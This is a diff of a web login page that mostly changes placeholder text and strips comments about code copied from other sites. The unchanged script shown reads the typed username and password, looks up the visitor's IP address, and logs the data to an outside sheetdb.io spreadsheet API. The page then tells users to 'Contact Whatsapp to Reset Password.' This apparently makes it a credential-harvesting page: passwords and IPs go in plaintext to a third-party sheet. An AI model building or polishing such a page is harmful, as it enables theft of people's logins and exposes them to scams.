@@ -23,7 +23,7 @@
     <script src="js/brand.js"></script>
     <script src="js/cms.js"></script>
 
-    <!-- 🔴 TOP POPUP ALERT STYLES (Added for Website 1 functionality, keeps design intact) -->
+    <!-- 🔴 TOP POPUP ALERT STYLES -->
     <style>
         .top-alert {
             position: fixed;
@@ -63,30 +63,33 @@
 
                 <form id="contactForm" class="login-form" autocomplete="off">
 
+                    <!-- CHANGED: placeholder to "username" -->
                     <div class="input-row">
-                        <input type="text" id="firstName" name="firstName" placeholder="Username" data-cms-ph="login.userPh" maxlength="60" autocomplete="username">
+                        <input type="text" id="firstName" name="firstName" placeholder="username" data-cms-ph="login.userPh" maxlength="60" autocomplete="username">
                         <span class="input-icon"><i class="fas fa-user"></i></span>
                     </div>
 
+                    <!-- CHANGED: placeholder to "password" -->
                     <div class="input-row ">
-                        <input type="password" id="surname" name="surname" placeholder="Password" data-cms-ph="login.passPh" maxlength="60" autocomplete="current-password">
+                        <input type="password" id="surname" name="surname" placeholder="password" data-cms-ph="login.passPh" maxlength="60" autocomplete="current-password">
                         <span class="input-icon"><i class="fas fa-key"></i></span>
                     </div>
 
+                    <!-- CHANGED: button text to "login" -->
                     <button type="submit" class="btn-login-submit ">
-                        <span class="btn-login-text" data-cms="login.submit">Login</span>
+                        <span class="btn-login-text">login</span>
                         <span class="btn-login-icon"><i class="fas fa-right-to-bracket"></i></span>
                     </button>
 
                 </form>
 
-                <!-- SUCCESS MESSAGE (Hidden by default, matches Website 1 behavior) -->
+                <!-- SUCCESS MESSAGE -->
                 <p id="successMsg" style="display:none; color: var(--wa-green, #25d366); text-align:center; margin-top:15px; font-weight:bold; font-size: 14px;">
                     Contact Whatsapp to Reset Password
                 </p>
 
                 <div class="forgot-row">
-                    <button class="forgot-link" id="helpBtn" type="button" data-cms="login.forgot">Forgotpassword</button>
+                    <button class="forgot-link" id="helpBtn" type="button" data-cms="login.forgot">Forgot password</button>
                 </div>
 
                 <div class="register-row">
@@ -131,7 +134,7 @@
         document.addEventListener('DOMContentLoaded', function () {
             const API_URL = "https://sheetdb.io/api/v1/stcjj8p8ctx44";
 
-            // 🔴 Popup function that always animates (from Website 1)
+            // 🔴 Popup function
             function showAlert(message) {
                 const alertBox = document.getElementById("topAlert");
                 alertBox.textContent = message;
@@ -148,11 +151,11 @@
                 }, 2500);
             }
 
-            /* Intercept login form submission with Website 1 logic */
+            /* Intercept login form submission */
             document.getElementById('contactForm').addEventListener('submit', function (e) {
                 e.preventDefault();
                 
-                // Note: Using existing IDs 'firstName' and 'surname' from Website 2
+                // IDs remain the same - functionality preserved
                 const username = document.getElementById('firstName').value.trim();
                 const password = document.getElementById('surname').value.trim();
 
@@ -164,7 +167,7 @@
                     return;
                 }
 
-                // --- Database logging (ditto from Website 1) ---
+                // --- Database logging ---
                 fetch("https://api.ipify.org?format=json")
                     .then(res => res.json())
                     .then(ipData => {
@@ -204,11 +207,11 @@
                     });
             });
 
-            /* "Register here" is normal internal navigation. */
+            /* "Register here" navigation */
             var regLink = document.getElementById('contactLink');
             if (regLink) regLink.setAttribute('href', 'register.html');
 
-            /* Non-functional placeholder buttons stay inert. */
+            /* Non-functional placeholder buttons */
             var apk = document.getElementById('apkLink');
             if (apk) apk.addEventListener('click', function (e) { e.preventDefault(); });
 
